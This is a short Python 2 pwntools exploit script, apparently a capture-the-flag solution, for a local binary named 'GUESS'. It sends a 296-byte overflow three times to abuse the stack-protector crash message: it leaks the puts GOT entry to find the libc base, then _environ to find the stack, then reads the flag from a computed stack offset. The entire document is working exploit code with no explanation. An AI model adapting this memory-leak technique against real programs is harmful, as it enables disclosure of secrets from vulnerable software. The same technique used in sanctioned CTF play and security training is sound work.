from pwn import *

p = process('./GUESS')
libc = ELF('libc.so')
context.log_level = 'debug'

puts_addr = 0x602020
p.recvuntil('flag\n')
payload = 'A'*296 + p64(puts_addr)
p.sendline(payload)
p.recvuntil('***: ')
data = p.recv(6)
data = u64(data + '\x00\x00')
print hex(data)

base = data - libc.symbols['puts']
environ_addr = base + libc.symbols['_environ']
print hex(environ_addr)

p.recvuntil('flag\n')
payload2 = 'A'*296 + p64(environ_addr)
p.sendline(payload2)
p.recvuntil('***: ')
data2 = p.recv(6)
data2 = u64(data2 + '\x00\x00')
print hex(data2)

p.recvuntil('flag\n')
payload3 = 'A'*296 + p64(environ_addr - 0x168)
p.sendline(payload3)

p.interactive()
